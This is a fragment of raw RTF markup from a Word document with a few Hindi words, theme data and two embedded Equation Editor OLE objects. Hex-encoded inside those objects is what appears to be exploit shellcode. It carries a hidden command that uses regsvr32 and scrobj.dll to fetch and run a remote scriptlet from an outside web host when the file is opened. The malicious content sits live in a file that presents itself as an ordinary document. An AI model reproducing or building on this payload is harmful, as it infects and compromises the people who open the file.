\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2310\'3f\u2347\'3f\u2381\'3f\u2344\'3f\u2379
\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2346\'3f\u2366\'3f\u2305\'3f\u2330\'3f
\u2380\'3f\u2306\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2360\'3f\u2376\'3f\u2344
\'3f\u2381\'3f\u2351\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2325\'3f\u2366\'3f
\u2352\'3f\u2366\'3f\u2327\'3f\u2366\'3f\u2352\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 
\uc1\u2340\'3f\u2379\'3f\u2337\'3f\u2375\'3f}{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 
\par }\pard \ltrpar\qj \li0\ri0\nowidctlpar\wrapdefault\aspalpha\aspnum\faauto\adjustright\rin0\lin0\itap0 {\rtlch\fcs1 \af31507 \ltrch\fcs0 \insrsid3495892 
\par }{\rtf1\ansi\ansicpg1252\deff0\nouicompat\deflang1033{\fonttbl{\f0\fnil\fcharset0 Calibri;}}
{\*\generator Riched20 6.3.9600}\viewkind4\uc1
\pard\sa200\sl276\slmult1\f0\fs22\lang9{\object\objemb\objupdate{\*\objclass Equation.3}\objw380\objh260{\*\objdata 01050000020000000b0000004571756174696f6e2e33000000000000000000000c0000d0cf11e0a1b11ae1000000000000000000000000000000003e000300feff0900060000000000000000000000010000000100000000000000001000000200000001000000feffffff0000000000000000fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffdffffff04000000fefffffffefffffffeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff52006f006f007400200045006e00740072007900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000016000500ffffffffffffffff0200000002ce020000000000c0000000000000460000000000000000000000008020cea5613cd30103000000000200000000000001004f006c00650000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000201ffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000000000000000000000001400000000000000010043006f006d0070004f0062006a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000120002010100000003000000ffffffff00000000000000000000000000000000000000000000000000000000000000000000000001000000660000000000000003004f0062006a0049006e0066006f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000012000201ffffffff04000000ffffffff000000000000000000000000000000000000000000000000000000000000000000000000030000000600000000000000feffffff02000000fefffffffeffffff050000000600000007000000feffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff010000020800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100feff030a0000ffffffff02ce020000000000c000000000000046170000004d6963726f736f6674204571756174696f6e20332e30000c0000004453204571756174696f6e000b0000004571756174696f6e2e3300f439b2710000000000000000000000000000000000000000000000000000000000000000000000000000000003000400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001c00000002009ec4a900000000000000c8a75c00c4ee5b0000000000030101030a0a01085a5a33c099b202c1e2082be2e8ffffffffc35b50648b40308b400899b203c1e21066ba120c03c28d5b1c53ffe07265677376723332202f75202f73202f693a687474703a2f2f6a6f622e736f66746c696e652e746f702f6164312e6a7067207363726f626a2e646c6c202320202020202020202020202020202020202020202020202020202020202020202020202020202020202020250000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004500710075006100740069006f006e0020004e00610074006900760065000000000000000000000000000000000000000000000000000000000000000000000020000200ffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000000000000000000004000000c5000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffffffffffffffffffff0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffffffffffffffffffff0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001050000050000000d0000004d45544146494c4550494354003421000035feffff9201000008003421cb010000010009000003c500000002001c00000000000500000009020000000005000000020101000000050000000102ffffff00050000002e0118000000050000000b0200000000050000000c02a001201e1200000026060f001a00ffffffff000010000000c0ffffffc6ffffffe01d0000660100000b00000026060f000c004d61746854797065000020001c000000fb0280fe0000000000009001000000000402001054696d6573204e657720526f6d616e00feffffff6b2c0a0700000a0000000000040000002d0100000c000000320a600190160a000000313131313131313131310c000000320a6001100f0a000000313131313131313131310c000000320a600190070a000000313131313131313131310c000000320a600110000a000000313131313131313131310a00000026060f000a00ffffffff0100000000001c000000fb021000070000000000bc02000000000102022253797374656d000048008a0100000a000600000048008a01ffffffff7cef1800040000002d01010004000000f0010000030000000000
}{\result {\rtlch\fcs1 \af0 \ltrch\fcs0 \dn8\insrsid95542\charrsid95542 {\pict{\*\picprop\shplid1025{\sp{\sn shapeType}{\sv 75}}{\sp{\sn fFlipH}{\sv 0}}
{\sp{\sn fFlipV}{\sv 0}}{\sp{\sn fLockAspectRatio}{\sv 1}}{\sp{\sn pictureGray}{\sv 0}}{\sp{\sn pictureBiLevel}{\sv 0}}{\sp{\sn fRecolorFillAsPicture}{\sv 0}}{\sp{\sn fUseShapeAnchor}{\sv 0}}{\sp{\sn fFilled}{\sv 0}}{\sp{\sn fHitTestFill}{\sv 1}}
{\sp{\sn fillShape}{\sv 1}}{\sp{\sn fillUseRect}{\sv 0}}{\sp{\sn fNoFillHitTest}{\sv 0}}{\sp{\sn fLine}{\sv 0}}{\sp{\sn fPreferRelativeResize}{\sv 1}}{\sp{\sn fReallyHidden}{\sv 0}}
{\sp{\sn fScriptAnchor}{\sv 0}}{\sp{\sn fFakeMaster}{\sv 0}}{\sp{\sn fCameFromImgDummy}{\sv 0}}{\sp{\sn fLayoutInCell}{\sv 1}}}\picscalex100\picscaley100\piccropl0\piccropr0\piccropt0\piccropb0
\picw353\pich600\picwgoal200\pichgoal340\wmetafile8\bliptag1846300541\blipupi2307{\*\blipuid 6e0c4f7df03da08a8c6c623556e3c652}0100090000035100000000001200000000000500000009020000000005000000020101000000050000000102ffffff00050000002e0118000000050000000b02
00000000050000000c02200240011200000026060f001a00ffffffff000010000000c0ffffffaaffffff00010000ca0100000b00000026060f000c004d61746854797065000040000a00000026060f000a00ffffffff010000000000030000000000}}}}{\object\objemb\objupdate{\*\objclass Equation.3}\objw660\objh260{\*\objdata 01050000020000000b0000004571756174696f6e2e33000000000000000000000c0000d0cf11e0a1b11ae1000000000000000000000000000000003e000300feff0900060000000000000000000000010000000100000000000000001000000200000001000000feffffff0000000000000000fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffdffffff04000000fefffffffefffffffeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff52006f006f007400200045006e00740072007900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000016000500ffffffffffffffff0200000002ce020000000000c0000000000000460000000000000000000000008020cea5613cd30103000000000200000000000001004f006c00650000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000201ffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000000000000000000000001400000000000000010043006f006d0070004f0062006a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000120002010100000003000000ffffffff00000000000000000000000000000000000000000000000000000000000000000000000001000000660000000000000003004f0062006a0049006e0066006f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000012000201ffffffff04000000ffffffff000000000000000000000000000000000000000000000000000000000000000000000000030000000600000000000000feffffff02000000fefffffffeffffff050000000600000007000000feffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff010000020800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100feff030a0000ffffffff02ce020000000000c000000000000046170000004d6963726f736f6674204571756174696f6e20332e30000c0000004453204571756174696f6e000b0000004571756174696f6e2e3300f439b2710000000000000000000000000000000000000000000000000000000000000000000000000000000003000400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001c00000002009ec4a900000000000000c8a75c00c4ee5b0000000000030101030a0a01085a5ab844eb7112ba7856341231d08b088b098b096683c13c31db5351be643e721231d6ff16536683ee4cff1090901421400000007265677376723332202f75202f73202f693a687474703a2f2f6a6f622e736f66746c696e652e746f702f6164312e6a7067207363726f626a2e646c6c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004500710075006100740069006F006E0020004E00610074006900760065000000000000000000000000000000000000000000000000000000000000000000000020000200FFFFFFFFFFFFFFFFFFFFFFFF00000000000000000000000000000000000000000000000000000000000000000000000004000000C5000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001050000050000000D0000004D45544146494C4550494354003421000035FEFFFF9201000008003421CB010000010009000003C500000002001C00000000000500000009020000000005000000020101000000050000000102FFFFFF00050000002E0118000000050000000B0200000000050000000C02A001201E1200000026060F001A00FFFFFFFF000010000000C0FFFFFFC6FFFFFFE01D0000660100000B00000026060F000C004D61746854797065000020001C000000FB0280FE0000000000009001000000000402001054696D6573204E657720526F6D616E00FEFFFFFF6B2C0A0700000A0000000000040000002D0100000C000000320A600190160A000000313131313131313131310C000000320A6001100F0A000000313131313131313131310C000000320A600190070A000000313131313131313131310C000000320A600110000A000000313131313131313131310A00000026060F000A00FFFFFFFF0100000000001C000000FB021000070000000000BC02000000000102022253797374656D000048008A0100000A000600000048008A01FFFFFFFF7CEF1800040000002D01010004000000F0010000030000000000
}{\result {\rtlch\fcs1 \af0 \ltrch\fcs0 \dn8\insrsid95542\charrsid95542 {\pict{\*\picprop\shplid1025{\sp{\sn shapeType}{\sv 75}}{\sp{\sn fFlipH}{\sv 0}}
{\sp{\sn fFlipV}{\sv 0}}{\sp{\sn fLockAspectRatio}{\sv 1}}{\sp{\sn pictureGray}{\sv 0}}{\sp{\sn pictureBiLevel}{\sv 0}}{\sp{\sn fRecolorFillAsPicture}{\sv 0}}{\sp{\sn fUseShapeAnchor}{\sv 0}}{\sp{\sn fFilled}{\sv 0}}{\sp{\sn fHitTestFill}{\sv 1}}
{\sp{\sn fillShape}{\sv 1}}{\sp{\sn fillUseRect}{\sv 0}}{\sp{\sn fNoFillHitTest}{\sv 0}}{\sp{\sn fLine}{\sv 0}}{\sp{\sn fPreferRelativeResize}{\sv 1}}{\sp{\sn fReallyHidden}{\sv 0}}
{\sp{\sn fScriptAnchor}{\sv 0}}{\sp{\sn fFakeMaster}{\sv 0}}{\sp{\sn fCameFromImgDummy}{\sv 0}}{\sp{\sn fLayoutInCell}{\sv 1}}}\picscalex100\picscaley100\piccropl0\piccropr0\piccropt0\piccropb0
\picw353\pich600\picwgoal200\pichgoal340\wmetafile8\bliptag1846300541\blipupi2307{\*\blipuid 6e0c4f7df03da08a8c6c623556e3c652}0100090000035100000000001200000000000500000009020000000005000000020101000000050000000102ffffff00050000002e0118000000050000000b02
00000000050000000c02200240011200000026060f001a00ffffffff000010000000c0ffffffaaffffff00010000ca0100000b00000026060f000c004d61746854797065000040000a00000026060f000a00ffffffff010000000000030000000000}}}}\par}
\par}{\*\themedata 504b030414000600080000002100e9de0fbfff0000001c020000130000005b436f6e74656e745f54797065735d2e786d6cac91cb4ec3301045f748fc83e52d4a
9cb2400825e982c78ec7a27cc0c8992416c9d8b2a755fbf74cd25442a820166c2cd933f79e3be372bd1f07b5c3989ca74aaff2422b24eb1b475da5df374fd9ad
5689811a183c61a50f98f4babebc2837878049899a52a57be670674cb23d8e90721f90a4d2fa3802cb35762680fd800ecd7551dc18eb899138e3c943d7e503b6
b01d583deee5f99824e290b4ba3f364eac4a430883b3c092d4eca8f946c916422ecab927f52ea42b89a1cd59c254f919b0e85e6535d135a8de20f20b8c12c3b0
0c895fcf6720192de6bf3b9e89ecdbd6596cbcdd8eb28e7c365ecc4ec1ff1460f53fe813d3cc7f5b7f020000ffff0300504b030414000600080000002100a5d6
a7e7c0000000360100000b0000005f72656c732f2e72656c73848fcf6ac3300c87ef85bd83d17d51d2c31825762fa590432fa37d00e1287f68221bdb1bebdb4f
c7060abb0884a4eff7a93dfeae8bf9e194e720169aaa06c3e2433fcb68e1763dbf7f82c985a4a725085b787086a37bdbb55fbc50d1a33ccd311ba548b6309512
0f88d94fbc52ae4264d1c910d24a45db3462247fa791715fd71f989e19e0364cd3f51652d73760ae8fa8c9ffb3c330cc9e4fc17faf2ce545046e37944c69e462
a1a82fe353bd90a865aad41ed0b5b8f9d6fd010000ffff0300504b0304140006000800000021006b799616830000008a0000001c0000007468656d652f746865
6d652f7468656d654d616e616765722e786d6c0ccc4d0ac3201040e17da17790d93763bb284562b2cbaebbf600439c1a41c7a0d29fdbd7e5e38337cedf14d59b
4b0d592c9c070d8a65cd2e88b7f07c2ca71ba8da481cc52c6ce1c715e6e97818c9b48d13df49c873517d23d59085adb5dd20d6b52bd521ef2cdd5eb9246a3d8b
4757e8d3f729e245eb2b260a0238fd010000ffff0300504b0304140006000800000021002ead900ed10600008c1a0000160000007468656d652f7468656d652f
7468656d65312e786d6cec595d8bdb46147d2ff43f08bd3bfe92fcb1c41b6cd9ceb6d94d42eca4e471d61e5b931d698c66bc1b130225792c144ad39287064a5f
fa50da061268a1e9afd934254d217fa17746b63c638fbbc992c252b286451a9d7be7ccbd57e78ea4f3176e47d439c409272c6eb8c57305d7c1f1800d493c6eb8
d7fbdd5ccd75b840f1105116e3863bc3dcbdb0fde107e7d1960871841db08ff9166ab8a11093ad7c9e0f6018f1736c8263b836624984049c26e3fc304147e037
a2f952a150c94788c4ae13a308dc5e198dc8003bcf7ffdede5770fdded85f70e852962c1e5c080263de91b1b260a3b3c284a049ff18026ce21a20d17261ab2a3
3ebe2d5c87222ee042c32da83f37bf7d3e8fb6e646546cb0d5ecbaea6f6e3737181e94d49cc9783f9bd4f37cafd2ccfc2b0015ebb84eb553e954327f0a800603
5869ca45f7e9b7eaadb63fc76aa0f4d0e2bb5d6d978b065ef35f5ee3dcf4e5cfc02b50eadf5bc377bb0144d1c02b508af7d7f09e572d059e8157a0145f59c357
0bcdb65735f00a1452121faca10b7ea51c2c569b41468cee58e175dfeb564b73e74b145443565d728a118bc5a65a8bd02d96740120811409123b6236c1233480
320e1025fb097176c93884c29ba09871182e940add4219fecb9fa78e5444d016469ab5e4054cf8da90e4e3f0414226a2e17e0c5e5d0df2fad98faf9f3d718eef
3d3dbef7cbf1fdfbc7f77e4e1d19563b281eeb56afbeffe2ef479f3a7f3df9f6d583afec78aee3fff8e9b3e7bf7f6907c24a972178f1f5e33f9f3e7ef1f0f397
3f3cb0c09b09dad7e17d1261ee5cc647ce3516c1c254084ce6783f793b8b7e88886ed18cc71cc548ce62f1df11a181be3c431459702d6c46f046021263035e9c
de3208f7c2642a88c5e3a53032807b8cd1164bac51b824e7d2c2dc9fc663fbe4c954c75d43e8d03677806223bf9de904b495d85c062136685ea52816688c632c
1c798d1d606c59dd4d428cb8ee9141c2381b09e726715a885843d227fb46352d8d7648047999d90842be8dd8ecdd705a8cda56ddc6872612ee0a442de4fb981a
61bc88a6024536977d14513de0bb48843692bd5932d0711d2e20d3634c99d31962ce6d36571258af96f44b202ff6b4efd159642213410e6c3e7711633ab2cd0e
821045131bb647e250c77ec40fa044917395091b7c8f9977883c873ca07863ba6f106ca4fb6435b80ecaaa535a1688bc324d2cb9bc889951bfbd191d21aca406
84dfd0f388c4278afb8aacfbffadac8390bef8e69165556755d09b09b1de513b2b32be09b72ade014b86e4ec6b771b4de3ab186e97f506f65ebadf4bb7fbbf97
ee4df7f3bb17eca546837ccbad62ba55571bf768e3be7d4428ed8919c5bb5c6ddd3974a6611706a59d7a68c5d973dc2484437927c304066e9c2065e3244c7c42
44d80bd104f6f745573a19f3b9eb3177268cc3b65f0d5b7d4b3c9d467b6c983eae168bf2d134150f8ec472bce067e3f0a8215274a5ba7c04cbdc2bb663f5a8bc
20206ddf8684369949a26c21515d0cca20a90773089a85845ad93b6151b7b0a849f78b54adb1006a595660ebe4c086abe1fa1e9880113c51218a87324f69aa17
d955c97c9799de144ca302601fb1a88065a6eb92ebc6e5c9d5a5a5f60699364868e566925091513d8c876888e7d52947df84c6dbe6babe4ca9414f8642cd07a5
b5a451adfd1b8bd3e61aec56b581c6ba52d0d8396ab895b20f25334093863b82c77e388c26503b5c6e79111dc3cbb38148d21bfe34ca3249b868231ea60157a2
93aa4144044e1c4aa2862b979fa581c64a4314b7620904e1cc92ab83ac9c3572907433c97834c203a1a75d1b91914e4f41e153adb05e55e6a7074b4b368574f7
c2e191b34fa7c9350425e6578b328043c2e1ed4f318de690c0ebcc4cc896f5b7d298e6b2abbf4f5435948e233a09d1bca3e8629ec295946774d4591603ed6cbe
6608a816927923dc1fcb06ab07d5e8a659d748396cecba271bc9c869a2b9ec9986aac8ae6957316386451b5889e5e99abcc66a1162d034bdc3a7d2bd2ab9f585
d6adec13b22e0101cfe267e9ba6fd010346acbc90c6a92f1ba0c4bcd9e8f9abd63b1c013a8bd4993d054bfb270bb12b7ac4758a783c153757eb05bad5a181a2d
f6952ad2eac387fe6982eddf02f168c34be029155ca5123e3c240836443db5274965036e91db627e6bc091334d48c3bd53f09b5e50f2835ca1e677725ed92be4
6a7eb39c6bfa7eb9d8f18b8576ab74171a8b08a3a29f7e74e9c2ab283a9b7f7a51e36b9f5fa2c5dbb6730316e599fabc9257c4d5e79762c9f6f9a52f3fafb80e
01d1b9532975ebe57aab92ab979bdd9cd76ed572f5a0d2cab52b41b5dd6d077eaddebdeb3a870aec35cb8157e9d472956210e4bc4a41d2afd57355af546a7ad5
66ade335efceb731b0f2543ee6b180f02a5edbff000000ffff0300504b0304140006000800000021000dd1909fb60000001b010000270000007468656d652f74
68656d652f5f72656c732f7468656d654d616e616765722e786d6c2e72656c73848f4d0ac2301484f78277086f6fd3ba109126dd88d0add40384e4350d363f24
51eced0dae2c082e8761be9969bb979dc9136332de3168aa1a083ae995719ac16db8ec8e4052164e89d93b64b060828e6f37ed1567914b284d262452282e3198
720e274a939cd08a54f980ae38a38f56e422a3a641c8bbd048f7757da0f19b017cc524bd62107bd5001996509affb3fd381a89672f1f165dfe514173d9850528
a2c6cce0239baa4c04ca5bbabac4df000000ffff0300504b01022d0014000600080000002100e9de0fbfff0000001c0200001300000000000000000000000000
000000005b436f6e74656e745f54797065735d2e786d6c504b01022d0014000600080000002100a5d6a7e7c0000000360100000b000000000000000000000000
00300100005f72656c732f2e72656c73504b01022d00140006000800000021006b799616830000008a0000001c00000000000000000000000000190200007468
656d652f7468656d652f7468656d654d616e616765722e786d6c504b01022d00140006000800000021002ead900ed10600008c1a000016000000000000000000
00000000d60200007468656d652f7468656d652f7468656d65312e786d6c504b01022d00140006000800000021000dd1909fb60000001b010000270000000000
0000000000000000db0900007468656d652f7468656d652f5f72656c732f7468656d654d616e616765722e786d6c2e72656c73504b050600000000050005005d010000d60a00000000}
{\*\colorschememapping 3c3f786d6c2076657273696f6e3d22312e302220656e636f64696e673d225554462d3822207374616e64616c6f6e653d22796573223f3e0d0a3c613a636c724d
617020786d6c6e733a613d22687474703a2f2f736368656d61732e6f70656e786d6c666f726d6174732e6f72672f64726177696e676d6c2f323030362f6d6169
6e22206267313d226c743122207478313d22646b3122206267323d226c743222207478323d22646b322220616363656e74313d22616363656e74312220616363
656e74323d22616363656e74322220616363656e74333d22616363656e74332220616363656e74343d22616363656e74342220616363656e74353d22616363656e74352220616363656e74363d22616363656e74362220686c696e6b3d22686c696e6b2220666f6c486c696e6b3d22666f6c486c696e6b222f3e}
{\*\latentstyles\lsdstimax371\lsdlockeddef0\lsdsemihiddendef0\lsdunhideuseddef0\lsdqformatdef0\lsdprioritydef99{\lsdlockedexcept \lsdqformat1 \lsdpriority0 \lsdlocked0 Normal;\lsdqformat1 \lsdpriority9 \lsdlocked0 heading 1;
\lsdsemihidden1 \lsdunhideused1 \lsdqformat1 \lsdpriority9 \lsdlocked0 heading 2;\lsdsemihidden1 \lsdunhideused1 \lsdqformat1 \lsdpriority9 \lsdlocked0 heading 3;\lsdsemihidden1 \lsdunhideused1 \lsdqformat1 \lsdpriority9 \lsdlocked0 heading 4;
\lsdsemihidden1 \lsdunhideused1 \lsdqformat1 \lsdpriority9 \lsdlocked0 heading 5;\lsdsemihidden1 \lsdunhideused1 \lsdqformat1 \lsdpriority9 \lsdlocked0 heading 6;\lsdsemihidden1 \lsdunhideused1 \lsdqformat1 \lsdpriority9 \lsdlocked0 heading 7;
\lsdsemihidden1 \lsdunhideused1 \lsdqformat1 \lsdpriority9 \lsdlocked0 heading 8;\lsdsemihidden1 \lsdunhideused1 \lsdqformat1 \lsdpriority9 \lsdlocked0 heading 9;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 index 1;
\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 index 2;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 index 3;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 index 4;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 index 5;
\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 index 6;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 index 7;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 index 8;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 index 9;
\lsdsemihidden1 \lsdunhideused1 \lsdpriority39 \lsdlocked0 toc 1;\lsdsemihidden1 \lsdunhideused1 \lsdpriority39 \lsdlocked0 toc 2;\lsdsemihidden1 \lsdunhideused1 \lsdpriority39 \lsdlocked0 toc 3;
\lsdsemihidden1 \lsdunhideused1 \lsdpriority39 \lsdlocked0 toc 4;\lsdsemihidden1 \lsdunhideused1 \lsdpriority39 \lsdlocked0 toc 5;\lsdsemihidden1 \lsdunhideused1 \lsdpriority39 \lsdlocked0 toc 6;
\lsdsemihidden1 \lsdunhideused1 \lsdpriority39 \lsdlocked0 toc 7;\lsdsemihidden1 \lsdunhideused1 \lsdpriority39 \lsdlocked0 toc 8;\lsdsemihidden1 \lsdunhideused1 \lsdpriority39 \lsdlocked0 toc 9;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Normal Indent;
\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 footnote text;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 annotation text;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 header;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 footer;
\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 index heading;\lsdsemihidden1 \lsdunhideused1 \lsdqformat1 \lsdpriority35 \lsdlocked0 caption;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 table of figures;
